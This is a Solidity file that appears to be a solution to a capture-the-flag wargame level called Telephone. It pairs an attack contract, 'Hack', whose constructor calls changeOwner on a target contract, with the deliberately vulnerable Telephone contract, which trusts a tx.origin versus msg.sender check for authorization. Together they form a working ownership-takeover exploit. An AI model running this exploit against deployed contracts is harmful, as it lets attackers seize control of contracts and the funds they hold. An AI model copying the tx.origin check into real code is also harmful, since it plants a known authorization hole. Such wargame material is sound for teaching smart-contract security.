pragma solidity ^0.8;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}

contract Hack {
    constructor(address _target) {
        // tx.origin = msg.sender
        // msg.sender = address(this)
        ITelephone(_target).changeOwner(msg.sender);
    }
}


//==========================================
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}